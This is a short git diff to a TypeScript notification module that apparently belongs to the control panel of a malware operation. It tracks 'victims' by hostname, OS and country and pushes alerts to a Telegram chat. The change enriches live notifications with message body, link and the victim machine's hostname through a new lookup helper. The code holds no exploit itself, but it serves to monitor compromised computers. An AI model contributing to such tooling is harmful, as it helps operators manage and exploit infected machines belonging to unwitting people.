@@ -30,7 +30,7 @@ export async function notify(input: NotifyInput): Promise<void> {
     if (existing) {
       if (existing.readAt) return;
       // An unread duplicate still refreshes the badge for live viewers.
-      void publish({ type: 'notification', victimId: input.victimId ?? undefined, at: Date.now(), data: { id: existing.id, kind: input.kind, title: input.title } });
+      void publish({ type: 'notification', victimId: input.victimId ?? undefined, at: Date.now(), data: { id: existing.id, kind: input.kind, title: input.title, body: input.body, link: input.link ?? null, victim: await victimName(input.victimId) } });
       return;
     }
   }
@@ -48,7 +48,7 @@ export async function notify(input: NotifyInput): Promise<void> {
     type: 'notification',
     victimId: input.victimId ?? undefined,
     at: Date.now(),
-    data: { id: notification.id, kind: input.kind, title: input.title }
+    data: { id: notification.id, kind: input.kind, title: input.title, body: input.body, link: input.link ?? null, victim: await victimName(input.victimId) }
   });
 
   const key = throttleKey(input);
@@ -73,6 +73,12 @@ export async function notify(input: NotifyInput): Promise<void> {
       body: JSON.stringify({ chat_id: env.TELEGRAM_CHAT_ID, text: text.slice(0, 3900), parse_mode: 'Markdown' })
     }).catch(() => undefined);
   }
+}
+
+async function victimName(victimId?: string | null): Promise<string> {
+  if (!victimId) return '';
+  const victim = await prisma.victim.findUnique({ where: { id: victimId }, select: { hostname: true } }).catch(() => null);
+  return victim?.hostname ?? '';
 }
 
 export async function notifyVictimNew(victim: { id: string; hostname: string; os: string; country: string | null }): Promise<void> {
